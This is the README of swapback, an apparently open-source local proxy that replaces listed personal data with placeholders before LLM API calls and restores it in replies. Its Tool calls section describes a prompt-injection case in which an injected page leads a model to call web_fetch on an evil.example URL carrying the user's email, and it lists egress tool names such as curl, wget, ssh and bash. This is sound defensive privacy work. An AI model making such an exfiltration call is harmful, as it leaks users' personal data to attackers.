<p align="center">
  <img src="https://raw.githubusercontent.com/rmpmrepo1278/swapback/main/docs/assets/banner.svg" alt="swapback: keep personal data out of LLM requests, restore it byte-exact in the reply" width="100%">
</p>

<p align="center">
  <a href="https://github.com/rmpmrepo1278/swapback/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
  <img src="https://img.shields.io/badge/python-3.11%20%7C%203.12%20%7C%203.13-blue.svg" alt="Python 3.11 | 3.12 | 3.13">
  <a href="https://github.com/rmpmrepo1278/swapback/actions/workflows/tests.yml"><img src="https://github.com/rmpmrepo1278/swapback/actions/workflows/tests.yml/badge.svg" alt="tests"></a>
  <img src="https://img.shields.io/badge/dependencies-3-brightgreen.svg" alt="3 dependencies">
</p>

<p align="center"><b>A local proxy that swaps personal data for placeholders before an LLM call and restores it, byte-exact, in the reply.</b></p>

---

## Why

**Your own list, any agent, any API, in code you can read.** swapback is a small local proxy for any agent or app that
talks OpenAI Chat Completions, OpenAI Responses or Anthropic Messages (set its base URL, change nothing else). You write
down the names, emails, phones, IDs and addresses that must never reach a model provider. The provider only sees
`«PERSON_1»`; your app gets the original text back, byte-exact, in plain and streamed replies. There is no model to
download and nothing probabilistic: exact matching plus patterns, about 5,200 lines of Python, 3 dependencies.

**Tool calls can't carry your listed values out.** An agent reads a page or an email with a prompt injection in it,
and the model is told to call `web_fetch("https://evil.example/?q=<your email>")`. The model only ever had
`«EMAIL_1»`, and a network, shell or send-style tool call keeps the placeholder unless you allow that tool. Tools you
trust (your own calendar or send-as-me tool) get the real value back. [Veil](#comparison) does this too, for coding
agents; swapback does it for any agent, by tool-name globs. From `swapback demo`:

```text
5) tool calls: the model asks to fetch a URL and to send an email
   web_fetch  {"url": "https://lookup.example/?q=«EMAIL_1»"}        <- left as a placeholder: it never leaves
   send_email {"to": "jane.doe@example.com", "body": "Hi, about Friday"}   <- on the allow list: real value restored
```

**Every common spelling, and a re-check that fails closed.** A listed value is matched in its written variants: any
case, extra or non-breaking spaces, `.` `_` `-` `+` `/` between words (also when the words are separate path
segments, `/Users/First/Last/`), lines of an address joined by HTML tags, with or without a line break after the tag (`<br>`,
`<br />\n`, `</p>\n<p>`, also inside JSON text), a hyphen inside a name written as a space or as
nothing (`Ferrand-Moreau`, `Ferrand Moreau`, `FerrandMoreau`, also surname first), surname first, accent-free (`ø` →
`o`), phone groupings with or without the country code, and a listed phone with letters glued on (`503-555-0147x22`,
`...0147ext9`, `Mob5035550147`) or inside a URL path (`/u/5035550147/profile`). It is also matched when the text is
encoded: JSON `\uXXXX`, `\n` and other escapes (JSON inside JSON up to 8 levels; a string with a run of 256 or more backslashes,
which is what an escape nested more than 8 levels deep or a backslash nested 8 deep becomes, blocks the request with
a `503` instead of being sent), HTML entities, `%XX` URL encoding
and form encoding (`+` for a space, `?q=Jane+Doe`), decomposed accents (NFD), zero-width characters and fullwidth
digits or letters.

After the swap, every outgoing string is checked again, two ways, and either one blocks the request (`503`) instead of
sending it: (1) the matcher's own rules again, in all of the spellings above; (2) a **skeleton check** that does not use
the matcher's rules. It reduces the string, and each decoded view of it (escapes, entities and `%XX`, up to 8 levels,
and the same with HTML tags read as spaces, block elements such as `<div>` or `<p>` as paragraph breaks),
to letters and digits only (accents stripped, NFKD-folded so fullwidth forms and ligatures become plain letters,
zero-width characters and soft hyphens removed, `[at]`/`[dot]` dropped), and looks for each listed name, email, ID and
address reduced the same way (at least 6 letters and digits; addresses 10), with any punctuation or nothing between
its parts, and for each listed phone's national digits in any run of digits joined by up to 3 non-letters, whatever
letters sit around it. The skeleton check keeps three of the matcher's rules on purpose: whitespace inside one word of a
listed value does not join (`Ellis on` is not `Ellison`), a dictionary-word name counts only when written as a name
(see below), and a name that fits inside one filesystem path segment (`/home/jane/`, `/home/Jane.Doe/`) is left; a
name whose words are separate segments (`/Users/Jane/Doe/`) is not. When a pattern detector (below) swapped part of a
string, the skeleton check also reads that string with only your listed values swapped, so a listed value that a
pattern swap cut into (a street line swapped on its own) still blocks. Any scrub error blocks too.
**Out of scope:** base64, hex, rot13 and other re-encodings, a value split across separate fields or messages, letters
spaced out with whitespace, listed names shorter than 6 letters in a spelling the matcher does not know (the skeleton
check skips them), and names you never listed (there is no NER).

- **Measured, and you can re-run it.** `swapback selftest` (about 8 seconds, made-up data shipped in the package) sends
  each listed value in 257 written forms through 7 request paths. 0.4.9: 34/34 listed values caught, 0 of 1,799 forms
  leaked, the re-check alone (swap switched off) sees 771/771 forms and its skeleton layer alone 514/514, 57/57
  ordinary sentences untouched (including ALL-CAPS headings), 1,694/1,694 exact round trips, 58/58 JSON-in-JSON
  multi-line restores valid, 87/87 JSON restores in a ```json fence, inline in prose or pasted valid, 60/60 addresses
  joined by `<br>\n`-style tags inside JSON swapped (not blocked), 68/68 doubly escaped tool-argument placeholders
  restored, 96/96 restores into JSON nested 1 to 8 levels valid and exact, 10/10 escaped values nested deeper blocked,
  7/7 dictionary-word names next to sentence ends or HTML elements handled, 96/96 restores into tool-call arguments
  with mixed escaping (1 to 8 inner levels) valid, 6/6 `\u00ab`-escaped placeholders in text replies restored, 7/7
  one-word HTML cells handled, 194/194 dictionary-word names split across one-word cells or blocks anywhere in a row
  or list swapped (and ordinary one-word blocks left alone), 3/3 example placeholders never assigned and broken known
  YAML reported as such, 3/3 bad `listen` values or ports in use reported in one line, a 200 KB `%XX` body checked in under a second, health reads `blocked` when the list file is deleted or broken mid-run. Unlisted
  values caught by the patterns alone: 6/8 (both unlisted names missed). A second holdout with different made-up data
  (33 listed values incl. names as path segments, `<br>`-joined addresses and fenced-JSON restores, 1,240 requests;
  written by the maintainer, not independent): 0.4.4 leaked 235 requests, 0.4.5 leaked 10, all of them the lower-case
  spelling of a dictionary-word name (`~/ruby/brooks/`), which matches Title Case only by design; fenced/inline JSON
  restores valid 0/125 → 125/125; false blocks on 2,400 chunks of ordinary text (Python standard library source,
  licence texts): 0 on both. See [Leak test](#leak-test-swapback-selftest).
- **Byte-exact restore.** The reply gets back the string as you wrote it: same case, same phone format, same spacing.
  A value restored inside a JSON string is JSON-escaped (quotes, backslashes, newlines), so the JSON stays valid:
  a whole JSON reply (JSON mode, structured output), and JSON inside a prose or markdown reply (a ```json fence, an
  object written inline). Inside JSON inside JSON it is escaped once per JSON level it really sits in (read from
  the text around it, up to 16 levels), so every level parses, also when the outer level is ASCII-escaped around raw
  inner JSON (`json.dumps` of a raw `json.dumps`) or the model wrote the placeholder `\u00ab`-escaped. Elsewhere in prose the value comes back as written, newlines included.
- **Fails closed, loudly.** A scrub error, an unreadable body, a missing or empty known file, a run of 256 or
  more backslashes (JSON nested more than 8 levels deep, or a backslash nested 8 deep: too deep to check) or a known value still present after the swap answers `503`, with a message in the API's own error shape that says what was blocked and why,
  plus one log line on stderr. A known file that goes missing or unreadable while the proxy runs turns
  `/scrubber/health` to `"status": "blocked"`, `"ok": false` until a good file is read again; one that suddenly shrinks
  keeps the old values protected, logs a warning and turns it to `"status": "warning"`, `"ok": false` (either way
  `swapback health` exits 1). `"known"` in health counts your unique listed values: a phone counts once, though it
  is matched in several written formats (`check-config`'s `known_by_type` counts the same way); the two built-in
  canary values are `"known_builtin"`. A missing or broken config file stops the CLI and the proxy with one error
  line (exit 2), not a traceback, and so does a `listen` value that is not `host:port` or a port already in use.
- **Names that are ordinary words stay out of ordinary sentences.** A listed name made only of dictionary words
  ("Drew Wells", "Jack Frost") is matched only when written as a name, every word capitalised, so "she drew wells"
  goes out unchanged, and not across a sentence end ("Saving Grace. Fields of gold"), a blank line or separate HTML
  block elements (`<div>Grace</div><div>Fields of gold</div>`), except when two neighbouring blocks each hold one word and together
  spell the listed name (`<td>Grace</td><td>Fields</td><td>Denver</td>`, `<li>Grace</li><li>Fields</li>`), wherever the
  pair sits in the row or list; ALL-CAPS ("CAROL SINGER WANTED") counts as a heading, not a name, unless you set
  `common_names_all_caps: true`. `common_names_title_case: false` matches them in any case.
- **Not a replacement for NER.** Names you never listed go out as written. Use it alongside an NER tool if you need
  that ([Use alongside other tools](#use-alongside-litellm-or-an-ner-tool)).

<p align="center"><img src="https://raw.githubusercontent.com/rmpmrepo1278/swapback/main/docs/assets/before-after.svg" alt="The app sends real values, the provider sees placeholders, the app gets the real values back" width="100%"></p>

## Quickstart (10 seconds, no API key)

Needs Python 3.11 or newer.

```bash
pip install swapback
swapback demo
```

`swapback demo` starts a built-in fake model that echoes what it receives, puts the proxy in front of it, and sends a
plain, a streamed and a tool-call request with made-up data. No config, no key, no network. Output (abridged):

```text
1) your app sends
   Email Jane Q Doe at jane.doe@example.com or call (425) 555-0182 about Friday.
2) the model receives
   Email «PERSON_1» at «EMAIL_1» or call «PHONE_1» about Friday.
3) your app gets back
   You said: Email Jane Q Doe at jane.doe@example.com or call (425) 555-0182 about Friday.
...
5) tool calls: the model asks to fetch a URL and to send an email
   web_fetch  {"url": "https://lookup.example/?q=«EMAIL_1»"}
   send_email {"to": "jane.doe@example.com", "body": "Hi, about Friday"}
PASS: the model never saw the made-up name, email or phone, and every reply came back exact.
```

From a clone, `examples/` has the same mock as a script (`examples/mock_upstream.py`, `examples/quickstart.yaml`,
`examples/curl_demo.sh`) if you want to run the two processes yourself.

### Set it up for a real provider

```bash
swapback init          # writes swapback.yaml, known.yaml and private_terms.example.yaml (0600) from the shipped examples
                       # then EDIT known.yaml: your names, emails, phones (see Configuration)
cp private_terms.example.yaml private_terms.yaml    # optional: codenames and money figures
```

`swapback init` never overwrites a file unless you pass `--force`; from a clone, the same examples sit in the repo root.

In `swapback.yaml`:

```yaml
upstream: https://api.openai.com      # a base URL WITHOUT /v1: the proxy appends the client's own path
known_file: known.yaml
private_terms_file: private_terms.yaml   # leave "" if you skipped the private terms file
```

### Build known.yaml from your contacts

Names are only swapped if they are in your known file, so most of the value is in that list. Instead of typing it,
build it from a contacts export:

```bash
swapback known init --vcf contacts.vcf                 # iPhone / macOS / Android export (vCard 2.1, 3.0, 4.0)
swapback known init --csv google_contacts.csv          # Google or Outlook CSV, or any name/email/phone columns
swapback known init --scan past_prompts.jsonl          # suggests names, emails, phones you have actually sent
```

- It reads full names, emails, phone numbers and street addresses, and merges them into `known_file` (or `--out`)
  without duplicates: `Jane Doe` and `jane doe`, or `425-555-0101` and `(425) 555-0101`, count once.
- The file is written with mode `0600`. Comments in an existing file are not kept.
- It prints counts only. `--show` also prints the values, `--dry-run` writes nothing.
- One-word contacts that are relations or common words (`Mom`, `Dentist`, `Will`) are skipped: matching is
  case-insensitive, so they would swap ordinary words. `--first-names` also adds each contact's first name on its own,
  with the same skip list.
- `--scan` reads text or JSONL (any JSON strings in it) and writes candidates to `known.suggestions.yaml`: emails and
  phones it finds, and capitalised two- or three-word names seen at least twice (`--min-count`). Suggestions are never
  used or merged on their own. Delete what is not personal, then merge with `swapback known init --yaml
  known.suggestions.yaml`.

Only Python's standard library and the existing dependencies are used; nothing is sent anywhere.

Edit or build `known.yaml` **before** you start the proxy. The example values are fake (`check-config` warns while they
are still there). A configured `known_file` that is missing or not valid YAML when the proxy starts stops it from
starting (one error line, exit code 2); one that is empty starts the proxy but blocks every request (`503`), and so
does one that goes missing, breaks or empties while the proxy runs (fail-closed). Then:

```bash
swapback check-config     # counts per type, never values
swapback-proxy            # listens on 127.0.0.1:8787
```

Point your client at the proxy. It keeps its usual path; only the host changes:

```python
from openai import OpenAI
client = OpenAI(base_url="http://127.0.0.1:8787/v1", api_key="sk-...")   # your key is forwarded as is
```

`upstream` is joined with the client's path, so `upstream: https://api.openai.com/v1` would request `/v1/v1/...`.
Other providers work the same way: `upstream: https://openrouter.ai` with client base URL
`http://127.0.0.1:8787/api/v1`; `upstream: https://api.anthropic.com` with an Anthropic SDK base URL of
`http://127.0.0.1:8787`.

## Use with agents

Any agent that lets you set a provider base URL can sit behind the proxy. Tested end to end with
[OpenClaw](https://github.com/openclaw/openclaw) 2026.10.7: a fresh clone, the steps above and one provider block gave a
scrubbed chat in a few minutes; replies, streamed replies and tool calls came back with the real values. Since 0.3.0
OpenClaw's `exec`, `web_fetch`, `web_search`, `browser` and `message` tools keep placeholders by default
(see [Tool calls](#tool-calls)).

```json5
// OpenClaw config (openclaw.json)
{
  models: { providers: { scrub: {
    baseUrl: "http://127.0.0.1:8787/v1",   // swapback
    apiKey: "${PROVIDER_API_KEY}",         // your provider key; the proxy forwards it unchanged
    api: "openai-completions",
    models: [{ id: "your-model", name: "your-model via swapback", reasoning: false, input: ["text"],
               cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }, contextWindow: 128000, maxTokens: 4096 }],
  } } },
  agents: { defaults: { model: { primary: "scrub/your-model" } } },
}
```

`api: "openai-completions"` was tested against a live model. `api: "anthropic-messages"` works from 0.1.1, which
restores Anthropic Messages streams (before, streamed replies in that mode kept their placeholders): set `baseUrl` to
`http://127.0.0.1:8787` (no `/v1`) and the proxy's `upstream` to an Anthropic-compatible endpoint. That mode was checked
end to end with OpenClaw against a mock Anthropic upstream, not yet against a live Claude model.

**What a block looks like in an agent.** When the proxy blocks a request (fail-closed), it answers `503` in the error
shape of the API the client called (OpenAI `{"error": {...}}`, Anthropic `{"type": "error", ...}`), with the header
`X-Swapback-Blocked` and a message written for a person: `swapback blocked this request (fail-closed), so nothing was
sent to the model: <reason>. Run swapback health for details.` Agents that show the provider's error message show
this one, usually after retrying a few times. Some show only a generic error (in our 0.4.0 test, OpenClaw said it
couldn't connect to the AI service), so the proxy also prints one line per block on stderr
(`swapback: blocked POST /v1/chat/completions: <reason>`; never a value). To see more:

```bash
swapback health                          # mode, counters, last_error
tail -n 5 ~/.local/state/swapback/requests.jsonl   # one line per request: status, blocked, error, swap counts
```

The usual causes are a missing or broken `known_file` / `private_terms_file`, a non-JSON or compressed body on a model
endpoint, or a known value still present after the swap.

**Check what the provider saw.** `requests.jsonl` records counts and types, never the text. To prove the provider got
placeholders only, run `swapback canary` (set `canary_model` first): it sends a fake name and email through the
running proxy, checks the provider's raw answer (`X-Scrubber-Raw: 1`) for the fake values and checks the restored answer
for them. `python examples/smoke.py` runs the same check offline against the mock upstream.

## How it works

<p align="center"><img src="https://raw.githubusercontent.com/rmpmrepo1278/swapback/main/docs/assets/architecture.svg" alt="Architecture: app or agent, then swapback, then the LLM API, with the restore path back" width="100%"></p>

1. **Swap.** Every string in the JSON request body is scanned. Values from your known-values file are matched as whole
   words, case-insensitively, in their common written variants (a phone number also matches `(425) 555-0182`,
   `425.555.0182`, `+14255550182`, ...; a multi-word value also matches with its words joined by non-breaking or
   repeated spaces, tabs, zero-width characters, `.`, `_`, `-`, `+`, `/` or `%20`, so `Jane.Q.Doe`, `JANE Q DOE`,
   `Jane+Q+Doe` and `Jane%20Q%20Doe` are the same person under one placeholder). Escaped text is decoded for matching
   (JSON `\uXXXX` and `\n`, nested JSON, HTML entities, `%XX`) and normalized (NFC for decomposed accents, zero-width
   characters removed, fullwidth ASCII folded), and each hit is mapped back to the span it came from. A listed name made
   only of dictionary words (a 64k-word English list ships in the package) matches only in Title Case (not in lower case, and not in ALL-CAPS unless
   `common_names_all_caps: true`); a
   comma between two ordinary lower-case words ("say grace, lee side") does not join a surname-first name. Detectors
   then catch what you did not list:
   - phone numbers via [`phonenumbers`](https://github.com/daviddrysdale/python-phonenumbers);
   - email, credit card (Luhn), IBAN, US SSN, IP address and profile URLs, from
     [Microsoft Presidio](https://github.com/microsoft/presidio)'s predefined recognizer patterns;
   - API keys and tokens, from the [gitleaks](https://github.com/gitleaks/gitleaks) default rules;
   - a few local rules: street addresses, keyword-anchored account numbers and dates of birth, order numbers, and
     gap rules for emails written as `name [at] example [dot] org` or with a full-width `＠` or hidden zero-width
     characters, and IPv6 addresses.
2. **Re-check.** After the swap, every outgoing string is checked again for known values: with the same variant rules
   in the same decoded and normalized views, and with the looser skeleton check described above (letters and digits
   only, no matcher rules). If either finds one, the request is blocked. `swapback selftest` checks this on its own,
   with the swap switched off: every form must be seen by the re-check, and it reports the skeleton layer alone.
3. **Forward or block.** Paths, headers (including `Authorization`) and the model name pass through unchanged. Any error
   while scrubbing answers `503` with a `scrubber_error`, and nothing is forwarded.
4. **Restore.** Placeholders in the reply are swapped back to the original text: plain JSON responses anywhere in the
   body, OpenAI-style `chat.completion.chunk` SSE streams, OpenAI Responses API streams (`output_text`, refusal and
   reasoning deltas, `function_call_arguments` and `custom_tool_call_input` deltas, and the `.done` and
   `response.completed` snapshots) and Anthropic Messages streams (`text_delta`, and `input_json_delta` for
   `tool_use`), delta by delta. A placeholder split across chunks is held back until complete.
   Values inside tool-call arguments, and inside the strings of a reply that is a JSON document (it starts with `{` or
   `[`), are JSON-escaped. Each variant comes back exactly as it was written in the request; a value that was written
   escaped (`S\u00f8ren`, `%C3%B8`) comes back in its plain spelling (`Søren`).

Placeholders are stable: a local vault (`vault.json`, mode `0600`) maps each value to the same placeholder across
requests, so multi-turn conversations stay coherent. A short system note asks the model to keep placeholders as written.
It is appended to your system prompt wherever the API keeps it: an OpenAI `system` or `developer` message (string or
content parts), Anthropic's top-level `system` (string or blocks) or the Responses API `instructions`. When the request
has no system prompt, one is added only if the request carries placeholders.

Every free-text field is scrubbed, including `user`, `metadata` and `instructions`. Only structural fields (`model`,
`role`, `type`, ids, `tool_choice`, `response_format`, `stop`, `reasoning_effort`, `service_tier` and function names)
are skipped, and those are still checked for known values before anything is sent.

Known names that fit inside one segment of a filesystem path (`/home/jane/notes.md`, `/home/Jane.Doe/`) are left
alone, so agents' file tools keep working. A listed multi-word name whose words are separate segments
(`/Users/Jane/Doe/notes.txt`, `Jane/Q/Doe`) is swapped like any other spelling, and the reply gets the path back as
written. Phones, emails and IDs are never left. URLs and domains are still scrubbed.

## Tool calls

A tool call's arguments are executed by your client, not by the provider. If the proxy puts real values back into
every tool call, a prompt-injected model can send them anywhere a tool can reach. For example, a web page tells the
model to "fetch" this:

```json
{"name": "web_fetch", "arguments": "{\"url\": \"https://evil.example/c?d=«EMAIL_1»\"}"}
```

With a plain restore, your client fetches `https://evil.example/c?d=you@example.com`. Since 0.3.0 that call keeps
`«EMAIL_1»`, and the request log counts it as `tool_kept` (a number, never the value).

The default policy, per tool call:

1. a name in `deny` keeps placeholders; a name in `allow` gets real values (names are case-insensitive globs, e.g.
   `mcp__github__*`);
2. a name that looks like network or shell egress keeps placeholders. The name is split into words (`WebFetch` →
   `web fetch`, `exec_command` → `exec command`) and matched against `egress_names`: `fetch`, `http`, `curl`,
   `wget`, `web`, `browse`, `request`, `url`, `navigate`, `download`, `upload`, `exec`, `shell`, `bash`, `sh`, `zsh`,
   `cmd`, `terminal`, `run`, `ssh`, `scp`, `rsync`, `git_push`, `push`, `email`, `mail`, `send`, `post`, `message`,
   `webhook`, `notify`, `publish` (some match word prefixes, e.g. `web*`; see `swapback.example.yaml`);
3. any other call keeps placeholders when one of its arguments is or contains a URL (`keep_if_url`);
4. everything else, such as `read_file` or `lookup_contact` without a URL, gets the real values back.

This applies to plain JSON replies and to streams (OpenAI chat chunks and Anthropic `tool_use`). When the name alone
does not decide, a streamed call's arguments are held until the call is complete and then sent in one piece.

The trade-off: an egress tool that you want to receive real values, such as your own `send_email`, now gets
placeholders until you allow it. Allow only tools whose destination you control.

```yaml
tool_restore:
  default: restore        # tools nothing else matches; `keep` = placeholders everywhere unless allowed
  keep_if_url: true
  allow: [send_email]     # always real values
  deny: [lookup_contact]  # never real values
  # egress_names: [...]   # replaces the built-in list
```

`tool_restore: false` restores every tool call, as 0.2 did.

**Why the default for other tools is `restore`, not `keep`.** Veil, for example, gives unknown tools pseudonyms.
swapback restores them because the tools left after the rules above are the ones that act on your machine and your
own accounts: writing a file, filling a form, creating a calendar event. Placeholders there are silent data corruption
(a saved document addressed to `«PERSON_1»`), and the egress cases are already caught by name and by URL. If your agent
loads tools you don't know (third-party MCP servers, plugins), set `default: keep` and allow the ones you trust; that is
the stricter setting, and the one to use when you can't review the tool list.

## Framework recipes

`tool_restore` is plain config; nothing in swapback knows any framework. These are starting points for common agents.
Tool names were checked against each project's own docs on 2026-11-09 unless marked unverified. "Kept by default"
means the built-in egress list already matches the name (`swapback check-config` shows the policy you end up with).

**Generic, strict.** Placeholders everywhere except the one or two tools that must address real people, ideally tools
that ask you before they act:

```yaml
tool_restore:
  default: keep
  allow: [send_email]          # your own tool names
```

**OpenClaw** (2026.10.7, from its tools index). Kept by default: `exec`, `terminal`, `code_execution`, `web_fetch`,
`web_search`, `browser`, `message`. Real values: `read`, `write`, `edit`, `apply_patch`, `cron`.

```yaml
tool_restore:
  allow: [message]             # only if replies go to your own channels or you approve each send:
                               # `message` can address any channel, so allowing it lets it carry real values out
  deny: [process, x_search, nodes]   # process writes to running commands; x_search queries X; nodes reaches
                                     # paired devices. None of these match the built-in list.
```

**Claude Code** (from its tools reference). Kept by default: `Bash`, `PowerShell`, `WebFetch`, `WebSearch`,
`SendMessage`, `PushNotification`. Real values: `Read`, `Write`, `Edit`, `NotebookEdit`, `Glob`, `Grep`, so files on
your machine stay correct. Nothing to add for most setups; `deny: [RemoteTrigger]` if you use remote triggers.

**Codex CLI** (tool names unverified: taken from third-party write-ups, not from Codex's source). Kept by default:
`exec_command`, `shell`, `web_search`. `write_stdin` sends input to a running command and does not match the built-in
list:

```yaml
tool_restore:
  deny: [write_stdin]
```

## Configuration

Copy `swapback.example.yaml` to `swapback.yaml`, or point `SWAPBACK_CONFIG` at any file. Every key is optional
and has an environment override. Relative paths are relative to the config file. A minimal working setup is in
[`examples/`](https://github.com/rmpmrepo1278/swapback/tree/main/examples).

| key | env | default | |
|---|---|---|---|
| `mode` | `SWAPBACK_MODE` | `on` | `on` swap + restore; `watch` count only, forward the original; `off` pass through |
| `listen` | `SWAPBACK_LISTEN` | `127.0.0.1:8787` | loopback only unless `allow_remote: true` |
| `upstream` | `SWAPBACK_UPSTREAM` | `https://api.openai.com` | any OpenAI-compatible base URL (OpenRouter, LiteLLM, vLLM, llama.cpp, ...) |
| `known_file` | `SWAPBACK_KNOWN_FILE` | none | your known values; configured but missing or empty means requests are blocked |
| `private_terms_file` | `SWAPBACK_PRIVATE_TERMS` | none | codenames and figures that must not leave (below) |
| `state_dir` | `SWAPBACK_STATE_DIR` | `~/.local/state/swapback` | vault and request log |
| `alert_webhook` | `SWAPBACK_ALERT_WEBHOOK` | none | POSTs `{"text": ...}` when a request is blocked or the canary fails |
| `canary_model` | `SWAPBACK_CANARY_MODEL` | none | model used by `swapback canary` |

Renamed from pii-scrubber in 0.2.0: the old `PII_SCRUBBER_*` variables are still read when the `SWAPBACK_*` one is unset, but they are deprecated.

Also: `tool_restore` (see [Tool calls](#tool-calls)), `hooks` (see [Hooks](#hooks)), `phone_regions`, `url_swap`, `patterns` (turn single detectors
off, e.g. `{IP: false}`), `common_names_title_case` (default `true`), `allow_empty_known`, `extra_secret_rules`, `log_requests`, `alert_min_interval_s`, `system_note`.

**Known values** (`known.example.yaml`). The exact strings to swap, by type. The file is re-read whenever its content
changes (also a save by rename); no restart needed. Guard rails, so a broken file never silently protects nothing:

- A configured known file with no values blocks every request (set `allow_empty_known: true` if you mean it).
- A known file deleted, unreadable or broken while the proxy runs blocks every request and reports `"status":
  "blocked"`, `"ok": false` in `/scrubber/health` (`swapback health` exits 1) until a good file is read again.
- If a reload finds the file empty or less than half its previous size, the proxy keeps protecting the previous values
  as well, prints a warning line on stderr, sends an alert and reports `"status": "warning"`, `"ok": false` in
  `/scrubber/health`. Restart the proxy to accept a smaller list.
- `swapback check-config` exits with code 2 when the known file has no values, so a script or CI step fails too.
- `swapback check-config`, the proxy's start line and `/scrubber/health` warn when the made-up example values from
  `swapback init` are still in the file, and when a listed name is also an ordinary phrase (`Will Hunt`). Such names are matched only when every word is
  capitalised, so "I will hunt for the keys" is left alone; `common_names_title_case: false` matches them in any case.
  Warnings name line numbers, never values.

A listed name also matches surname first (`Doe, Jane Q`) and without accents (`Anais` for `Anaïs`); a listed ID also
matches with its spaces and dashes removed (`QQ123456C` for `QQ 12 34 56 C`). Every variant shares the value's placeholder.

```yaml
PERSON:
  - Jane Q Doe
EMAIL:
  - jdoe@corp.example
PHONE:
  - "425-555-0182"        # also matches (425) 555-0182, 425.555.0182, +14255550182, ...
```

**Phones.** A listed phone is matched as you wrote it and by its digits in any grouping, with or without a country
code or leading 0 (`98765 43210` also matches `+91 9876543210`). The common US formats are added only for numbers
that are actually US. `phone_regions` (default `[US]`) is a different setting: it tells the *pattern detector* which
countries' numbers to find when they are not listed and written without a `+` country code. Add yours, e.g.
`phone_regions: [US, IN, AU]`.

**Private terms** (`private_terms.example.yaml`). Things that are not PII but must not leave: phrases or regexes become
`«PRIVATE_TERM_n»`, and money amounts are matched in every written form (`$2.47B`, `2.47 billion`, `$2,470M`) as
`«PRIVATE_FIGURE_n»`.

```yaml
terms:
  - Project Bluebird
  - {regex: "11[\\s-]*FTEs?"}
figures:
  - 2470000000
```

**CLI.** `swapback check-config` (counts per type, never values), `swapback stats`, `swapback health`,
`swapback scrub-file request.json`, and `swapback canary`, which sends a fake name and email through the running
proxy and checks that the provider saw only placeholders and the client got the values back. `GET /scrubber/health` on
the proxy returns counters. Every command takes `--help` and `--version`; `swapback-proxy --help` lists the settings it reads and exits without starting.

## Hooks

Swapback can call your own Python code at a few points of each request, for things that belong next to the privacy
filter but are not part of it: a spend cap, a fallback to a local model when the provider is down or over quota,
usage accounting, an extra health endpoint. Name a module (or a `.py` file, relative to the config file) in
`swapback.yaml`; every function in it is optional:

```yaml
hooks:
  module: spend_cap.py        # or an importable module name; entry_point: <name> reads the swapback.hooks group
  options: {daily_usd: 5}     # handed to setup()
```

| function | when | may return |
|---|---|---|
| `setup(options, cfg)` | once, at start | |
| `before_forward(req, ctx)` | before each request goes upstream | `None`, a new route `{"url", "body", "headers", "timeout_s"}`, or `{"respond": {"status", "json"}}` to answer without calling anyone |
| `on_upstream_response(resp, ctx)` | the upstream answered >= 400 or was unreachable (`resp.status` is `None`) | `None`, or a route to try once instead |
| `on_usage(obj, ctx)` | each JSON reply and each SSE event, as the provider sent it | |
| `on_complete(result, ctx)` | once per request, after the reply (`status`, response `headers`, `rerouted`) | |
| `extra_routes()` | at start | `{"/path": fn}`: extra GET endpoints, `fn()` returns JSON or `(status, json)` |
| `alert(text)` | instead of `alert_webhook` | |

`req` has `method`, `path`, `headers` (the outgoing headers; edit it in place, for example to drop a header only your
hook reads), `body` (parsed JSON, read-only: return `{"body": ...}` to change it) and `api` (`chat`, `anthropic`,
`responses`). `ctx` is one dict per request shared by all calls; anything you put in `ctx["log"]` is written to
`requests.jsonl` under `hook` (keep it to counts and short words).

**Hooks never see real values.** In `mode: on` they get the request after scrubbing and the replies before restore,
so `«EMAIL_1»`, not the address. A rerouted or locally answered reply is restored like any other. In `watch` and
`off` nothing is scrubbed, so a hook sees what is forwarded.

**Failure policy.** An exception in `setup` stops the proxy from starting. An exception in `before_forward` or
`on_upstream_response` fails closed: 503, nothing forwarded, an alert, like a scrub error. `on_usage`, `on_complete`
and `alert` run after the reply has started, so their exceptions are only counted (`hook_errors` in
`/scrubber/health`). A changed `hooks` section needs a restart.

A daily spend cap that falls back to a local llama.cpp server once the cap is reached:

```python
# spend_cap.py
import datetime
SPENT, OPT = {}, {}
PRICE = {"prompt_tokens": 3e-6, "completion_tokens": 15e-6}      # USD per token, your provider's prices

def setup(options, cfg):
    OPT.update(options)

def _today():
    return datetime.date.today().isoformat()

def before_forward(req, ctx):
    if SPENT.get(_today(), 0) >= OPT["daily_usd"] and req.api == "chat":
        ctx["log"]["capped"] = 1
        return {"url": "http://127.0.0.1:8080/v1/chat/completions", "body": dict(req.body, model="local")}

def on_upstream_response(resp, ctx):                  # provider down or over quota: same request, local model
    if resp.status is None or resp.status in (429, 503):
        return {"url": "http://127.0.0.1:8080/v1/chat/completions", "body": dict(ctx["request"].body, model="local")}

def on_usage(obj, ctx):
    u = obj.get("usage") if isinstance(obj, dict) else None
    if u:
        SPENT[_today()] = SPENT.get(_today(), 0) + sum(u.get(k, 0) * p for k, p in PRICE.items())

def extra_routes():
    return {"/spend": lambda: {"today_usd": round(SPENT.get(_today(), 0), 4), "cap_usd": OPT["daily_usd"]}}
```

`swapback check-config` lists the hook functions it found.

## Use alongside LiteLLM or an NER tool

swapback does one narrow thing: the values you listed never reach the provider in any spelling, tool calls that could
send data out keep placeholders, and anything it can't check is blocked. It does not try to find names you never
listed. It stacks with tools that do:

- **Behind LiteLLM (or any gateway).** Point your app at swapback and set swapback's `upstream` to your LiteLLM proxy
  (`upstream: http://127.0.0.1:4000`). LiteLLM keeps doing routing, keys, budgets and its Presidio guardrail for
  unlisted names; swapback adds the listed-value guarantee, the tool-call egress policy and fail-closed behaviour
  before anything reaches the gateway.
- **With an NER proxy (PasteGuard, Kiji, Maskit, Veil's NER).** Chain them: app → swapback → NER proxy → provider.
  swapback swaps your listed values first, so the NER pass only has to deal with what's left, and a missed listed
  value blocks instead of depending on a model's recall. Put swapback first so the restore of exact values happens
  last on the way back.
- **With Presidio in your own code.** Use Presidio to find candidate names in your data, then add the ones you care
  about to `known.yaml` (`swapback known init` merges a contacts export; `--scan` suggests more from your own files).

## Comparison

Other open-source projects do the same job. This table reflects each project's own README and docs as read on
2026-11-09; "unclear" means we could not confirm it there. Corrections are welcome.

| | **swapback** | [PasteGuard][pg] | [Maskit][mk] | [Veil][vl] | [piighost][ph] | [Kiji Privacy Proxy][kj] |
|---|---|---|---|---|---|---|
| License | MIT | Apache-2.0 | AGPL-3.0 | Apache-2.0 | MIT | Apache-2.0 |
